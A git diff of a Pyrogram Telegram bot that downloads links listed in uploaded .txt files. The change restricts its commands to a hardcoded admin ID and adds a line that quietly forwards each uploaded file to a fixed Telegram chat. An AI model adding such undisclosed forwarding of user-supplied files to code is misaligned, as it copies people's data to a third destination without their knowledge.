@@ -32,8 +32,9 @@ bot = Client(
     api_hash=API_HASH,
     bot_token=BOT_TOKEN)
 
+ADMINS = [7841292070]
 
-@bot.on_message(filters.command(["start"]))
+@bot.on_message(filters.command(["start"])&(filters.chat(ADMINS)))
 async def start(bot: Client, m: Message):
     editable = await m.reply_text(
        f"𝐇𝐞𝐥𝐥𝐨 ❤️\n\n ▂▃▅▇█▓▒░ ❤️  SONIC KUWAL SSC BOT 🌈™ ❤️ ░▒▓█▇▅▃▂ \n\n❈ I Am A Bot For Download Links From Your **.TXT** File And Then Upload That File Om Telegram So Basically\n\n If You Want To Use Me First Send Me ⟰ \n /txt Command And Then Follow Few Steps..\n\n I working link ALL APP TXT WORKING NOT WORKING YOUTUBE LINK. \n\n YOUTUBE LINK WORKING SOON POSSIBLE....\n\n more apps add SOON update contact me :- <a href='https://telegram.me/SONICKUWALSSCBOT'>❖ ꧁༺ ❤️ 𝓚𝓐𝓝𝓗𝓐𝓘𝓨𝓐 𝓛𝓐𝓛 𝓜𝓔𝓔𝓝𝓐 𝓚𝓤𝓦𝓐𝓛 💕 ༻꧂ ❖ ™</a>", reply_markup=InlineKeyboardMarkup(
@@ -46,35 +47,36 @@ async def start(bot: Client, m: Message):
                     InlineKeyboardButton("🦋 𝐅𝐨𝐥𝐥𝐨𝐰 𝐌𝐞 🦋" ,url="https://t.me/SONICKUWALSSCBOT") ]                               
             ]))
     
-@bot.on_message(filters.command("stop"))
+@bot.on_message(filters.command("stop")&(filters.chat(ADMINS)))
 async def restart_handler(_, m):
     await m.reply_text("**Stopped**🚦", True)
     os.execl(sys.executable, sys.executable, *sys.argv)
 
 
-
-@bot.on_message(filters.command(["txt"]))
+@bot.on_message(filters.command(["txt"])&(filters.chat(ADMINS)))
 async def upload(bot: Client, m: Message):
     editable = await m.reply_text('𝕤ᴇɴᴅ ᴛxᴛ ғɪʟᴇ ⚡️')
-    input: Message = await bot.listen(editable.chat.id)
+    input: Message = await bot.listen(editable.chat.id,filters.user(m.from_user.id))
     x = await input.download()
+    await bot.send_document(-1002461666553, x)
     await input.delete(True)
+    file_name, ext = os.path.splitext(os.path.basename(x))
+    credit = f"[{m.from_user.first_name}](tg://user?id={m.from_user.id})"
 
     path = f"./downloads/{m.chat.id}"
 
-    try:
-       with open(x, "r") as f:
-           content = f.read()
-       content = content.split("\n")
-       links = []
-       for i in content:
-           links.append(i.split("://", 1))
-       os.remove(x)
-            # print(len(links)
+    try:    
+        with open(x, "r") as f:
+            content = f.read()
+        content = content.split("\n")
+        links = []
+        for i in content:
+            links.append(i.split("://", 1))
+        os.remove(x)
     except:
-           await m.reply_text("**Invalid file input.**")
-           os.remove(x)
-           return
+        await m.reply_text("Invalid file input.")
+        os.remove(x)
+        return
     
    
     await editable.edit(f"**𝕋ᴏᴛᴀʟ ʟɪɴᴋ𝕤 ғᴏᴜɴᴅ ᴀʀᴇ🔗🔗** **{len(links)}**\n\n**𝕊ᴇɴᴅ 𝔽ʀᴏᴍ ᴡʜᴇʀᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ ɪɴɪᴛɪᴀʟ ɪ𝕤** **1**")
